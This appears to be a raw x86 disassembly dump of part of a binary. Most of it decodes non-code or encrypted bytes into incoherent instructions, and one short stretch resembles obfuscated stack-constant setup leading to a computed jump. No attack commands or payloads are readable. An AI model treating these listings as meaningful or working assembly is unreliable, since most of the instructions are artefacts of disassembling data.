  40cd76:	dec    edx
  40cd77:	adc    al,0xd2
  40cd79:	out    dx,al
  40cd7a:	cmp    al,0x50
  40cd7c:	inc    ebx
  40cd7d:	hlt    
  40cd7e:	sar    ch,cl
  40cd80:	mul    BYTE PTR [edi-0x25]
  40cd83:	(bad)  
  40cd84:	adc    eax,0xa754b025
  40cd89:	aas    
  40cd8a:	push   0x75
  40cd8c:	ret    0x91c4
  40cd8f:	jns    0x40cd5a
  40cd91:	xchg   ebp,eax
  40cd92:	pop    es
  40cd93:	adc    bh,BYTE PTR [edi+0x6ff18f8e]
  40cd99:	or     esp,DWORD PTR [eax-0x1f]
  40cd9c:	outs   dx,DWORD PTR ds:[esi]
  40cd9d:	ret    
  40cd9e:	xchg   ebp,eax
  40cd9f:	ret    
  40cda0:	xor    ah,ch
  40cda2:	rol    edi,cl
  40cda4:	mov    esp,gs
  40cda6:	cdq    
  40cda7:	jmp    0xd646:0xf09fa8f5
  40cdae:	dec    edx
  40cdaf:	push   esp
  40cdb0:	cmp    eax,0xbf471527
  40cdb5:	sub    esp,DWORD PTR [ebx]
  40cdb7:	fsubr  DWORD PTR [esi+0x7f]
  40cdba:	add    BYTE PTR es:[edi+0x776abc5d],ah
  40cdc1:	scas   al,BYTE PTR es:[edi]
  40cdc2:	mov    ds:0x452113e8,eax
  40cdc7:	loopne 0x40ce39
  40cdc9:	sbb    eax,0xd3c2c507
  40cdce:	stos   BYTE PTR es:[edi],al
  40cdcf:	add    dh,BYTE PTR gs:[ebp+0x60d0be18]
  40cdd6:	dec    eax
  40cdd7:	jo     0x40cd61
  40cdd9:	mov    bl,BYTE PTR [edx+0x5f]
  40cddc:	int3   
  40cddd:	cmp    DWORD PTR ds:0x8c299d1c,0xbc7f41a4
  40cde7:	loope  0x40ce43
  40cde9:	call   0xfd55:0xe7005822
  40cdf0:	loop   0x40ce15
  40cdf2:	mov    bl,0x5e
  40cdf4:	retf   
  40cdf5:	mov    esi,0x3ff44264
  40cdfa:	jmp    0x7c09:0xd0ae66
  40ce01:	sbb    al,0x74
  40ce03:	xor    esp,edi
  40ce05:	lea    edi,[ebx+0x741d70db]
  40ce0b:	adc    DWORD PTR [ebx+0x7],ebx
  40ce0e:	fs inc ecx
  40ce10:	mov    ah,0x59
  40ce12:	ss pop ebp
  40ce14:	pop    eax
  40ce15:	ret    
  40ce16:	(bad)  
  40ce17:	mov    ebp,0x82c58c79
  40ce1c:	jne    0x40ce94
  40ce1e:	and    BYTE PTR [ebx],al
  40ce20:	sbb    eax,0xc891ec31
  40ce25:	pop    esi
  40ce26:	shr    DWORD PTR [edx],1
  40ce28:	or     DWORD PTR [ebp-0x1bba7426],ebx
  40ce2e:	sbb    DWORD PTR [edi],ebp
  40ce30:	mov    ecx,0x631231a8
  40ce35:	mov    bl,0x89
  40ce37:	cmc    
  40ce38:	cmp    eax,0x910ae769
  40ce3d:	mov    esp,0x60786cd1
  40ce42:	stos   DWORD PTR es:[edi],eax
  40ce43:	shl    DWORD PTR [ebx+0x5a],0x4b
  40ce47:	aad    0xfa
  40ce49:	mov    cl,BYTE PTR [edi-0x144ec977]
  40ce4f:	fist   DWORD PTR [ecx-0x62]
  40ce52:	dec    ebp
  40ce53:	gs pop eax
  40ce55:	(bad)  
  40ce56:	mov    esi,0x686d7d27
  40ce5b:	cs stos BYTE PTR es:[di],al
  40ce5e:	sbb    BYTE PTR [edx],ch
  40ce60:	push   0x31cc0d3c
  40ce65:	das    
  40ce66:	xor    eax,0x3a69ffc1
  40ce6b:	xchg   edi,eax
  40ce6c:	popf   
  40ce6d:	pop    edi
  40ce6e:	mov    ds:0xd5b364d2,al
  40ce73:	retf   
  40ce74:	lds    edx,FWORD PTR [ecx-0x2a]
  40ce77:	stc    
  40ce78:	stc    
  40ce79:	pop    es
  40ce7a:	sub    edx,edi
  40ce7c:	or     cl,BYTE PTR [esi-0x67c01c01]
  40ce82:	(bad)  
  40ce83:	xchg   ebp,eax
  40ce84:	fisttp QWORD PTR [esi+0x10]
  40ce87:	mov    dh,0xc4
  40ce89:	ret    
  40ce8a:	pop    ds
  40ce8b:	dec    eax
  40ce8c:	out    0x82,al
  40ce8e:	pop    ebp
  40ce8f:	scas   al,BYTE PTR es:[edi]
  40ce90:	ror    BYTE PTR [eax],cl
  40ce92:	aas    
  40ce93:	mov    esi,0x6079e598
  40ce98:	jb     0x40ce2b
  40ce9a:	aad    0xac
  40ce9c:	mov    ah,0x67
  40ce9e:	repnz inc ebp
  40cea0:	(bad)  
  40cea1:	loopne 0x40ce3f
  40cea3:	xor    esp,DWORD PTR [ebx]
  40cea5:	cli    
  40cea6:	push   es
  40cea7:	push   ebp
  40cea8:	push   edi
  40cea9:	jecxz  0x40cefd
  40ceab:	mov    ecx,0xbad25b25
  40ceb0:	pop    es
  40ceb1:	loopne 0x40cef1
  40ceb3:	popa   
  40ceb4:	lods   eax,DWORD PTR ds:[esi]
  40ceb5:	xor    eax,0xe764259
  40ceba:	loop   0x40cefe
  40cebc:	pop    ebx
  40cebd:	push   ebp
  40cebe:	retf   0xa72b
  40cec1:	push   0xffffff92
  40cec3:	or     DWORD PTR [edx+0x59feff90],eax
  40cec9:	ds xor eax,0x850c0d67
  40cecf:	jle    0x40ceaf
  40ced1:	sbb    ecx,DWORD PTR [edi]
  40ced3:	and    eax,0xaddb8aab
  40ced9:	(bad)  
  40ceda:	or     al,0x3c
  40cedc:	aad    0xf
  40cede:	and    BYTE PTR ds:0x444c37f0,al
  40cee4:	sbb    al,0xc6
  40cee6:	push   ebx
  40cee7:	scas   al,BYTE PTR es:[edi]
  40cee8:	add    al,BYTE PTR [eax+0x61]
  40ceeb:	ficomp WORD PTR [ebx+0xa]
  40ceee:	adc    al,0x97
  40cef0:	adc    ch,BYTE PTR [edi]
  40cef2:	inc    eax
  40cef3:	test   DWORD PTR [edi],ecx
  40cef5:	adc    eax,0xdac7aad
  40cefa:	xchg   esp,eax
  40cefb:	sbb    edi,DWORD PTR [ebx+0x69f7cabe]
  40cf01:	mov    dh,0x6f
  40cf03:	mov    esp,0xbf72729f
  40cf08:	jp     0x40cf1c
  40cf0a:	(bad)  
  40cf0c:	jbe    0x40cf22
  40cf0e:	cld    
  40cf0f:	or     DWORD PTR [esi-0x10dc2dd6],esi
  40cf15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf16:	cmp    al,0xa
  40cf18:	xlat   BYTE PTR ds:[ebx]
  40cf19:	or     edi,DWORD PTR [ebx-0x56]
  40cf1c:	adc    bh,BYTE PTR [edx+0x1c]
  40cf1f:	dec    esi
  40cf20:	pop    es
  40cf21:	adc    cl,al
  40cf23:	jbe    0x40cf32
  40cf25:	pop    eax
  40cf26:	in     al,0xff
  40cf28:	js     0x40ceca
  40cf2a:	leave  
  40cf2b:	ja     0x40cf39
  40cf2d:	shr    BYTE PTR [esi+0x0],0xf5
  40cf31:	xlat   BYTE PTR cs:[ebx]
  40cf33:	nop
  40cf34:	jmp    0x5f6e2d59
  40cf39:	out    dx,al
  40cf3a:	xor    BYTE PTR [eax+0xa953eca],bh
  40cf40:	mov    eax,0xf2f1003
  40cf45:	ret    
  40cf46:	fstp   DWORD PTR [edx+0x3]
  40cf49:	ret    0x648a
  40cf4c:	jge    0x40cfb6
  40cf4e:	je     0x40cf7b
  40cf50:	add    al,0xd2
  40cf52:	push   ss
  40cf53:	push   ss
  40cf54:	push   0x2
  40cf56:	push   0x29fd47be
  40cf5b:	xchg   eax,edx
  40cf5d:	je     0x40cf71
  40cf5f:	sbb    dh,BYTE PTR [edi-0xc]
  40cf62:	and    al,0xb8
  40cf64:	mov    ch,0x53
  40cf66:	add    ch,ch
  40cf68:	outs   dx,BYTE PTR ds:[esi]
  40cf69:	push   0x77
  40cf6b:	dec    ebx
  40cf6c:	push   eax
  40cf6d:	fdiv   QWORD PTR [ebp-0x678e075b]
  40cf73:	popa   
  40cf74:	mov    esp,0xae6d5009
  40cf79:	in     eax,dx
  40cf7a:	pop    es
  40cf7b:	stos   BYTE PTR es:[edi],al
  40cf7c:	sbb    eax,0x9d905662
  40cf81:	ss jb  0x40cf6c
  40cf84:	xor    dh,dh
  40cf86:	inc    esp
  40cf87:	fucomip st,st(0)
  40cf89:	add    DWORD PTR [ebp+0x6b93a93e],edi
  40cf8f:	mov    ch,0x51
  40cf91:	out    dx,eax
  40cf92:	jge    0x40cff9
  40cf94:	xor    bh,BYTE PTR [ebp-0xfd0556d]
  40cf9a:	jmp    0x40cf91
  40cf9c:	xchg   esp,eax
  40cf9d:	bound  edi,QWORD PTR [edi+0x7f]
  40cfa0:	and    eax,0xb6e2aa09
  40cfa5:	push   0x622974ee
  40cfaa:	jl     0x40d029
  40cfac:	dec    edi
  40cfad:	mov    edx,0x46cd825
  40cfb2:	nop
  40cfb3:	sbb    al,BYTE PTR [edi-0x42d4908c]
  40cfb9:	cli    
  40cfba:	clc    
  40cfbb:	xchg   edx,eax
  40cfbc:	shl    DWORD PTR [ebp+0x5d],cl
  40cfbf:	ret    
  40cfc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfc1:	in     eax,dx
  40cfc2:	push   eax
  40cfc3:	aas    
  40cfc4:	scas   al,BYTE PTR es:[edi]
  40cfc5:	loop   0x40cfa1
  40cfc7:	pop    ebx
  40cfc8:	mov    bl,BYTE PTR [ebp-0x44]
  40cfcb:	jge    0x40cff9
  40cfcd:	add    eax,0xc3417143
  40cfd2:	dec    esi
  40cfd3:	fisttp WORD PTR [esi+0x7c4044e5]
  40cfd9:	and    DWORD PTR [edx],0xffffff9f
  40cfdc:	retf   
  40cfdd:	adc    al,0xad
  40cfdf:	sub    eax,0xd67f5ca7
  40cfe4:	into   
  40cfe5:	cdq    
  40cfe6:	push   ds
  40cfe7:	test   BYTE PTR [ecx-0x76],ch
  40cfea:	in     al,dx
  40cfeb:	in     al,0x9a
  40cfed:	arpl   sp,ax
  40cfef:	mov    bh,0xf5
  40cff1:	(bad)  
  40cff3:	ins    BYTE PTR es:[edi],dx
  40cff4:	inc    esp
  40cff5:	adc    bh,BYTE PTR [ebp+0x38f152e2]
  40cffb:	dec    esi
  40cffc:	add    BYTE PTR [ebx+0x7c6f70a8],dl
  40d002:	adc    al,0xe4
  40d004:	inc    eax
  40d005:	int3   
  40d006:	retf   0xe276
  40d009:	sub    bl,BYTE PTR [esi]
  40d00b:	fsqrt  
  40d00d:	iret   
  40d00e:	fistp  QWORD PTR [edi-0x33e6a903]
  40d014:	loopne 0x40d024
  40d016:	add    al,0xb4
  40d018:	and    esi,DWORD PTR [ebx+0x7f2bbf44]
  40d01e:	adc    esi,eax
  40d020:	(bad)  
  40d021:	push   ebx
  40d022:	push   edx
  40d023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d024:	(bad)  
  40d025:	push   edi
  40d026:	daa    
  40d027:	pop    ds
  40d028:	arpl   WORD PTR [esi-0x53],bp
  40d02b:	(bad)  
  40d02c:	lods   eax,DWORD PTR ds:[esi]
  40d02d:	hlt    
  40d02e:	je     0x40cff3
  40d030:	std    
  40d031:	jbe    0x40d097
  40d033:	sar    BYTE PTR [edx+0x1401245b],cl
  40d039:	push   cs
  40d03a:	aas    
  40d03b:	cmp    BYTE PTR [esi],al
  40d03d:	(bad)  
  40d03e:	jge    0x40d03a
  40d040:	adc    DWORD PTR [ecx-0x8],ecx
  40d043:	bound  ebx,QWORD PTR [ebx-0x3252d848]
  40d049:	push   edx
  40d04a:	call   0x11fa4470
  40d04f:	addr16 xchg edx,eax
  40d051:	test   BYTE PTR [edi],bh
  40d053:	rcl    BYTE PTR [esi+0x65],0xd2
  40d057:	and    ecx,DWORD PTR [eax-0x50]
  40d05a:	dec    ebx
  40d05b:	int3   
  40d05c:	aad    0x79
  40d05e:	dec    ebp
  40d05f:	mov    eax,DWORD PTR [esi-0x1]
  40d062:	mov    bh,0x8b
  40d064:	icebp  
  40d065:	jp     0x40d0c3
  40d067:	adc    al,0xc8
  40d069:	fwait
  40d06a:	ss popf 
  40d06c:	xor    al,0xbe
  40d06e:	sub    esp,DWORD PTR [ebp+0x2bd44b3d]
  40d074:	mov    bl,0x3d
  40d076:	call   0xbc8273c1
  40d07b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d07c:	adc    BYTE PTR [ecx+0x65f5414],bl
  40d082:	(bad)  
  40d084:	dec    edi
  40d085:	sub    al,0x64
  40d087:	std    
  40d088:	sbb    al,0x1f
  40d08a:	add    bh,dh
  40d08c:	nop
  40d08d:	(bad)  
  40d08e:	pop    eax
  40d08f:	sub    eax,0x4fdf733c
  40d094:	aam    0x47
  40d096:	std    
  40d097:	es es push 0x3b
  40d09b:	aam    0x62
  40d09d:	iret   
  40d09e:	imul   ebp,DWORD PTR [edi+0x7d],0x19ac0f57
  40d0a5:	pop    edi
  40d0a6:	add    DWORD PTR [edi+0x248edf80],esi
  40d0ac:	test   cl,ch
  40d0ae:	fwait
  40d0af:	aas    
  40d0b0:	aaa    
  40d0b1:	mov    edi,0x25e41062
  40d0b6:	and    dl,bl
  40d0b8:	lods   al,BYTE PTR ds:[esi]
  40d0b9:	repz sti 
  40d0bb:	push   ebx
  40d0bc:	in     al,0xda
  40d0be:	(bad)  
  40d0bf:	daa    
  40d0c0:	jbe    0x40d08c
  40d0c2:	and    edi,eax
  40d0c4:	pop    ss
  40d0c5:	pop    ebx
  40d0c6:	or     eax,0xc7ec47b8
  40d0cb:	dec    ebp
  40d0cc:	xchg   ecx,eax
  40d0cd:	push   eax
  40d0ce:	scas   al,BYTE PTR es:[edi]
  40d0cf:	mov    DWORD PTR [ebp-0x20],eax
  40d0d2:	adc    edx,0x5a
  40d0d5:	mov    DWORD PTR [ebp-0x1c],edx
  40d0d8:	mov    DWORD PTR [ebp-0x80],0xfa4
  40d0df:	mov    DWORD PTR [ebp-0x70],0x618e
  40d0e6:	mov    DWORD PTR [ebp-0x6c],0x811
  40d0ed:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40d0f7:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40d101:	mov    DWORD PTR [ebp-0x88],0x58ff
  40d10b:	mov    DWORD PTR [ebp-0x84],0x7394
  40d115:	xor    eax,eax
  40d117:	inc    eax
  40d118:	mov    DWORD PTR [ebp-0x64],eax
  40d11b:	mov    DWORD PTR [ebp-0x8],0x5f59
  40d122:	mov    DWORD PTR [ebp-0x4],0x652b
  40d129:	mov    DWORD PTR [ebp-0xc],0xf43
  40d130:	mov    DWORD PTR [ebp-0x14],0x22dc
  40d137:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40d13e:	mov    DWORD PTR [ebp-0x30],0x28e1
  40d145:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40d14c:	mov    DWORD PTR [ebp-0x50],0x3910
  40d153:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40d15a:	mov    DWORD PTR [ebp-0x24],0x6111
  40d161:	mov    DWORD PTR [ebp-0x78],ecx
  40d164:	mov    DWORD PTR [ebp-0x34],ecx
  40d167:	mov    DWORD PTR [ebp-0x44],0x207a
  40d16e:	mov    DWORD PTR [ebp-0x60],eax
  40d171:	mov    DWORD PTR [ebp-0x8c],0x7840
  40d17b:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40d182:	mov    eax,DWORD PTR [ebp-0x30]
  40d185:	or     eax,0x70c5
  40d18a:	add    eax,DWORD PTR [ebp-0x2c]
  40d18d:	mov    ecx,DWORD PTR [ebp-0x14]
  40d190:	or     eax,ecx
  40d192:	mov    ecx,0xce40
  40d197:	sub    ecx,eax
  40d199:	jmp    0x40d5a4
  40d19e:	imul   eax,ebx,0xb67c365b
  40d1a4:	lods   al,BYTE PTR ds:[esi]
  40d1a5:	xchg   esp,eax
  40d1a6:	adc    dl,0x9e
  40d1a9:	nop
  40d1aa:	jp     0x40d1a1
  40d1ac:	or     BYTE PTR [edx-0x4141186f],dl
  40d1b2:	xchg   edx,eax
  40d1b3:	les    edi,FWORD PTR [esi-0x1e699742]
  40d1b9:	fcom   QWORD PTR [edi-0x3e]
  40d1bc:	je     0x40d1c2
  40d1be:	lods   al,BYTE PTR ds:[esi]
  40d1bf:	sbb    edx,DWORD PTR [eax+ecx*1]
  40d1c2:	daa    
  40d1c3:	and    esp,DWORD PTR [edx]
  40d1c5:	jae    0x40d210
  40d1c7:	bound  ebx,QWORD PTR [esp+ecx*1]
  40d1ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1cb:	inc    ecx
  40d1cc:	sub    ch,BYTE PTR [edi]
  40d1ce:	into   
  40d1cf:	inc    edi
  40d1d0:	enter  0x4b0d,0xf8
  40d1d4:	ss test al,0xbe
  40d1d7:	enter  0x25fd,0x6
  40d1db:	add    dh,BYTE PTR [ebp+0x3ff0022d]
  40d1e1:	inc    esi
  40d1e2:	in     al,dx
  40d1e3:	std    
  40d1e4:	sti    
  40d1e5:	add    esp,DWORD PTR [edi]
  40d1e7:	popa   
  40d1e8:	mov    al,0x7f
  40d1ea:	retf   0x7c42
  40d1ed:	or     al,0x9c
  40d1ef:	xchg   ebp,eax
  40d1f0:	loop   0x40d196
  40d1f2:	sahf   
  40d1f3:	or     ch,BYTE PTR [ebx+0x21c326a]
  40d1f9:	loopne 0x40d193
  40d1fb:	mov    edx,0x5965daf9
  40d200:	and    dl,BYTE PTR ds:[ebx-0x45]
  40d204:	mov    ebp,0xaded742d
  40d209:	aaa    
  40d20a:	pop    es
  40d20b:	test   BYTE PTR [esi-0x1],cl
  40d20e:	pop    ebx
  40d20f:	cs (bad) 
  40d211:	lahf   
  40d212:	outs   dx,BYTE PTR ds:[esi]
  40d213:	sbb    cl,bh
  40d215:	sub    cl,al
  40d217:	(bad)  
  40d218:	sub    ah,BYTE PTR [eax+0x69]
  40d21b:	sub    al,BYTE PTR [esi+0x62]
  40d21e:	scas   al,BYTE PTR es:[edi]
  40d21f:	ins    BYTE PTR es:[edi],dx
  40d220:	jg     0x40d255
  40d222:	pop    ds
  40d223:	rcr    BYTE PTR [esi-0x27894bd3],1
  40d229:	jns    0x40d279
  40d22b:	xor    edi,DWORD PTR [edx-0x52]
  40d22e:	jne    0x40d2ac
  40d230:	hlt    
  40d231:	jmp    0x4c0b:0x7d7692
  40d238:	in     eax,0xd3
  40d23a:	pop    es
  40d23b:	push   0x15
  40d23d:	push   0x7d
  40d23f:	inc    DWORD PTR [esi+0x594144c1]
  40d245:	mov    esp,0x207577d
  40d24a:	test   al,0xae
  40d24c:	jecxz  0x40d230
  40d24e:	add    BYTE PTR [ecx-0x4606de8e],al
  40d254:	stc    
  40d255:	jmp    0xcb5bcf9e
  40d25a:	sub    eax,0xfd2f3495
  40d25f:	mov    bl,0x97
  40d261:	or     al,0x24
  40d263:	mov    ecx,0x2d24bc92
  40d268:	loopne 0x40d2a3
  40d26a:	ror    esi,1
  40d26c:	cmc    
  40d26d:	lahf   
  40d26e:	test   al,0x8
  40d270:	sub    bh,BYTE PTR [ebp+0x7f]
  40d273:	jo     0x40d2f2
  40d275:	es jmp 0x40d2eb
  40d278:	in     al,dx
  40d279:	xor    eax,esi
  40d27b:	pop    ecx
  40d27c:	xchg   edi,eax
  40d27d:	shl    BYTE PTR [ebx],1
  40d27f:	in     eax,0x95
  40d281:	call   0x51a90049
  40d286:	push   esp
  40d287:	cmp    BYTE PTR [eax],dl
  40d289:	sti    
  40d28a:	lods   eax,DWORD PTR ds:[esi]
  40d28b:	mov    edi,0xdc5c609
  40d290:	sbb    eax,0x380138f7
  40d295:	add    bh,BYTE PTR ds:0xb7531ac3
  40d29b:	lds    eax,FWORD PTR [ebx+0x3bb43cbc]
  40d2a1:	cli    
  40d2a2:	in     al,dx
  40d2a3:	mov    al,ds:0x9f44d044
  40d2a8:	out    dx,eax
  40d2a9:	cmp    ebx,DWORD PTR [ebx+0x109ccc3]
  40d2af:	push   ebx
  40d2b0:	push   es
  40d2b1:	jns    0x40d316
  40d2b3:	add    ebx,DWORD PTR [ecx-0x61ff33d1]
  40d2b9:	scas   al,BYTE PTR es:[edi]
  40d2ba:	aam    0xc1
  40d2bc:	es mov esi,0xa5ec00ee
  40d2c2:	xchg   ebp,eax
  40d2c3:	lods   eax,DWORD PTR ds:[esi]
  40d2c4:	pop    ds
  40d2c5:	lar    edi,WORD PTR [edx+ecx*2]
  40d2c9:	cli    
  40d2ca:	fs gs mov ecx,0xbad28d37
  40d2d1:	mov    al,0x7f
  40d2d3:	push   es
  40d2d4:	pop    ecx
  40d2d5:	dec    ebp
  40d2d6:	dec    esp
  40d2d7:	and    BYTE PTR [ecx],ah
  40d2d9:	adc    ch,BYTE PTR [esi+0x18aa12ef]
  40d2df:	or     al,0xc
  40d2e1:	cmp    BYTE PTR [eax+0x8dff5ba],bl
  40d2e7:	mov    ebp,0xc9185cc3
  40d2ec:	mov    edx,DWORD PTR [ebx]
  40d2ee:	xchg   esp,eax
  40d2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2f1:	mov    DWORD PTR [ebx-0x3b],esi
  40d2f4:	scas   eax,DWORD PTR es:[edi]
  40d2f5:	mov    ds:0x94dee02b,al
  40d2fa:	cmp    DWORD PTR [eax-0x11383f20],ebx
  40d300:	in     al,dx
  40d301:	jmp    0x58db861a
  40d306:	inc    edx
  40d307:	popa   
  40d308:	sbb    al,0xad
  40d30a:	jle    0x40d2b6
  40d30c:	push   0x5a
  40d30e:	les    esp,FWORD PTR [edx-0x7dde8f0e]
  40d314:	push   ss
  40d315:	cmp    BYTE PTR [edx+edi*2-0x4a],0x41
  40d31a:	stos   BYTE PTR es:[edi],al
  40d31b:	cld    
  40d31c:	inc    ebx
  40d31d:	push   esp
  40d31e:	push   es
  40d31f:	dec    ebp
  40d320:	wrmsr  
  40d322:	sahf   
  40d323:	adc    bh,BYTE PTR [edi+0x49]
  40d326:	mov    ds:0x5476778c,al
  40d32b:	call   0xec037c7c
  40d330:	dec    edx
  40d331:	sbb    bh,dl
  40d333:	and    esi,DWORD PTR [ebx+0x1e4475e]
  40d339:	push   ebp
  40d33a:	bound  ebx,QWORD PTR [eax]
  40d33c:	cmp    ecx,DWORD PTR [ebx+0x331310f]
  40d342:	aaa    
  40d343:	inc    esp
  40d344:	data16 sbb ah,ah
  40d347:	sub    al,0x70
  40d349:	imul   eax,DWORD PTR [ebp+0x512b363b],0xffffffd4
  40d350:	fwait
  40d351:	std    
  40d352:	mov    al,ds:0xb7a1d435
  40d357:	fwait
  40d358:	popa   
  40d359:	inc    ebp
  40d35a:	(bad)  
  40d35c:	inc    eax
  40d35d:	inc    BYTE PTR [ecx-0x740dcb05]
  40d363:	ja     0x40d327
  40d365:	int    0xca
  40d367:	ret    
  40d368:	mov    bl,0xda
  40d36a:	idiv   BYTE PTR [esi+0xf]
  40d36d:	sub    al,0x8a
  40d36f:	fisubr WORD PTR ds:0x2f8342e9
  40d375:	cmp    DWORD PTR [ecx-0x5e],ebx
  40d378:	fcomp  QWORD PTR [edx+0x6b66d41]
  40d37e:	mov    bl,0x7e
  40d380:	cdq    
  40d381:	dec    edx
  40d382:	sar    BYTE PTR [ebp-0x24910177],cl
  40d388:	outs   dx,DWORD PTR ds:[esi]
  40d389:	adc    BYTE PTR [esi+0x220aa5f0],cl
  40d38f:	lahf   
  40d390:	mov    BYTE PTR [ebx+esi*2-0x68],al
  40d394:	cmp    BYTE PTR [ebx+0x2024122e],bh
  40d39a:	sub    bh,0xc7
  40d39d:	test   eax,0xe96e40f0
  40d3a2:	das    
  40d3a3:	jbe    0x40d3c6
  40d3a5:	les    edx,FWORD PTR [eax]
  40d3a7:	into   
  40d3a8:	cli    
  40d3a9:	rcr    ah,cl
  40d3ab:	xor    al,0x14
  40d3ad:	inc    eax
  40d3ae:	(bad)  
  40d3af:	(bad)  
  40d3b0:	fs fwait
  40d3b2:	outs   dx,BYTE PTR ds:[esi]
  40d3b3:	dec    esp
  40d3b4:	xlat   BYTE PTR ds:[ebx]
  40d3b5:	std    
  40d3b6:	test   eax,0x7626fa12
  40d3bb:	mov    ebp,0xba05be46
  40d3c0:	jmp    0x40d43a
  40d3c2:	xchg   ebp,eax
  40d3c3:	je     0x40d358
  40d3c5:	mov    ds:0xa6600a6f,eax
  40d3ca:	jp     0x40d377
  40d3cc:	dec    DWORD PTR [edi+0x54671628]
  40d3d2:	fstp   QWORD PTR [eax]
  40d3d4:	les    esi,FWORD PTR [edx+0x44472314]
  40d3da:	jmp    0x9cd4:0xb4459dfd
  40d3e1:	pop    es
  40d3e2:	dec    ecx
  40d3e3:	pop    ss
  40d3e4:	lahf   
  40d3e5:	dec    ebp
  40d3e6:	retf   0x8a63
  40d3e9:	fcmovnbe st,st(0)
  40d3eb:	or     eax,0x5edb3eda
  40d3f0:	inc    esp
  40d3f1:	push   esp
  40d3f2:	mov    eax,0xc999458f
  40d3f7:	dec    ecx
  40d3f8:	sbb    eax,0x4bf791d0
  40d3fd:	adc    BYTE PTR [ebx+0x7a],bh
  40d400:	fisttp QWORD PTR [edi+0x6001bdd5]
  40d406:	xchg   edi,eax
  40d407:	pop    es
  40d408:	(bad)  
  40d409:	mov    esi,0x5e22635d
  40d40e:	push   ebp
  40d40f:	jno    0x40d43d
  40d411:	mov    edx,0xbab622b
  40d416:	(bad)  
  40d417:	lds    ebp,FWORD PTR gs:[ecx+0x25]
  40d41b:	in     al,dx
  40d41c:	std    
  40d41d:	outs   dx,BYTE PTR ds:[esi]
  40d41e:	bound  esp,QWORD PTR [eax]
  40d420:	or     al,dh
  40d422:	inc    edx
  40d423:	(bad)  
  40d425:	je     0x40d495
  40d427:	push   0xffffff91
  40d429:	xchg   ecx,eax
  40d42a:	leave  
  40d42b:	stc    
  40d42c:	add    DWORD PTR [esi-0x447a351c],esp
  40d432:	es ins DWORD PTR es:[edi],dx
  40d434:	pop    ebp
  40d435:	sti    
  40d436:	je     0x40d4a6
  40d438:	outs   dx,BYTE PTR ds:[esi]
  40d439:	std    
  40d43a:	call   0x243df6d8
  40d43f:	xchg   BYTE PTR [ebp-0x5938daec],dh
  40d445:	mov    ch,BYTE PTR [ebx]
  40d447:	std    
  40d448:	and    bl,BYTE PTR [ecx]
  40d44a:	jbe    0x40d485
  40d44c:	(bad)  
  40d44d:	adc    eax,0x38d08ad
  40d452:	mov    esi,0x78c713a4
  40d457:	push   ebx
  40d458:	cwde   
  40d459:	mov    BYTE PTR [edi],bh
  40d45b:	mov    ebx,0xb40dfe5c
  40d460:	sbb    BYTE PTR [ecx],bh
  40d462:	js     0x40d402
  40d464:	mov    cl,0x77
  40d466:	ins    BYTE PTR es:[edi],dx
  40d467:	or     ecx,edx
  40d469:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d46a:	or     eax,0x919bb800
  40d46f:	mov    esi,0xee2f578b
  40d474:	mov    ds:0xe0cebd76,eax
  40d479:	add    dh,ah
  40d47b:	mov    bl,0x34
  40d47d:	add    edx,DWORD PTR [edx+0x50]
  40d480:	jl     0x40d45c
  40d482:	lods   al,BYTE PTR ds:[esi]
  40d483:	clc    
  40d484:	nop
  40d485:	sub    BYTE PTR [eax],bh
  40d487:	dec    esi
  40d488:	pop    edi
  40d489:	test   BYTE PTR [ebx+0x13cecd55],ch
  40d48f:	and    al,0xb9
  40d491:	aam    0x66
  40d493:	mov    al,0xc0
  40d495:	data16 mov WORD PTR [ebx-0x63fb536f],gs
  40d49c:	mov    gs,WORD PTR [edi+0x5b]
  40d49f:	clc    
  40d4a0:	ins    BYTE PTR es:[edi],dx
  40d4a1:	rcr    BYTE PTR [edi+0x27],1
  40d4a4:	addr16 in eax,0x2c
  40d4a7:	fisub  DWORD PTR [ecx-0x1d]
  40d4aa:	xchg   ebx,eax
  40d4ab:	pop    esi
  40d4ac:	jge    0x40d4fd
  40d4ae:	cmp    BYTE PTR ds:0xf12c17c3,dl
  40d4b4:	(bad)  
  40d4b6:	outs   dx,BYTE PTR ds:[esi]
  40d4b7:	sbb    bl,BYTE PTR [ebx+ebp*1+0xd33fc1e]
  40d4be:	cld    
  40d4bf:	inc    ebp
  40d4c0:	ins    BYTE PTR es:[edi],dx
  40d4c1:	push   ebp
  40d4c2:	(bad)  
  40d4c4:	in     eax,0x3d
  40d4c6:	push   cs
  40d4c7:	fstp   TBYTE PTR [esi-0x205305b0]
  40d4cd:	call   0x43c9:0x59208573
  40d4d4:	gs js  0x40d4f2
  40d4d7:	hlt    
  40d4d8:	int    0xb0
  40d4da:	dec    eax
  40d4db:	jecxz  0x40d4c7
  40d4dd:	sub    dl,dl
  40d4df:	cmp    esi,DWORD PTR [ecx+edx*1-0x32a0bede]
  40d4e6:	sbb    BYTE PTR [ebx],dl
  40d4e8:	ja     0x40d4da
  40d4ea:	in     eax,0xf
  40d4ec:	jg     0x40d522
  40d4ee:	or     eax,0x856cdab5
  40d4f3:	pop    ds
  40d4f4:	shl    BYTE PTR ds:0xa4e39276,0x67
  40d4fb:	iret   
  40d4fc:	test   cl,cl
  40d4fe:	sub    DWORD PTR [ebp+0x21b1244],0xffffffa5
  40d505:	xchg   edx,eax
  40d506:	jae    0x40d4b6
  40d508:	rcr    BYTE PTR ds:0x1a824502,1
  40d50e:	popa   
  40d50f:	add    BYTE PTR [esp+edi*1-0x7a],bl
  40d513:	adc    BYTE PTR [eax],dh
  40d515:	add    esp,ecx
  40d517:	mov    bh,0xb3
  40d519:	(bad)  
  40d51a:	ds jbe 0x40d4fa
  40d51d:	pop    eax
  40d51e:	(bad)  
  40d51f:	jmp    0xf5d7ab54
  40d524:	jb     0x40d4bd
  40d526:	add    edx,DWORD PTR [edx+eax*2]
  40d529:	fsub   QWORD PTR [ebx+0x65d8f24c]
